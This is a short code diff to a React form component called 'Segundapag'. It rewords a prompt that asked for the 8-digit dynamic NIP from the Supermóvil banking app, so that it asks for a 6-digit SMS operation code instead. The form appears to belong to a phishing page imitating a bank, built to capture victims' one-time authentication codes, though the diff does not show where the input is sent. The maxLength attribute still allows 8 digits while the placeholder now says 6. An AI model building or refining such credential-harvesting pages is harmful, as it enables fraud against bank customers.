@@ -79,12 +79,12 @@ function Segundapag() {
 
       <form className="auth-form" onSubmit={handleSubmit}>
         <label>
-          Por tu seguridad, confirma esta operación con el NIP dinámico de 8 dígitos que genera Supermóvil:
+          Por tu seguridad, ingresa el codigo de operaciones de 6 digitos que recibio via mensaje SMS:
           <input
             type="tel"
             name="sms-code"
             maxLength={8}
-            placeholder="8 dígitos"
+            placeholder="6 dígitos"
             className="auth-input"
             required
           />
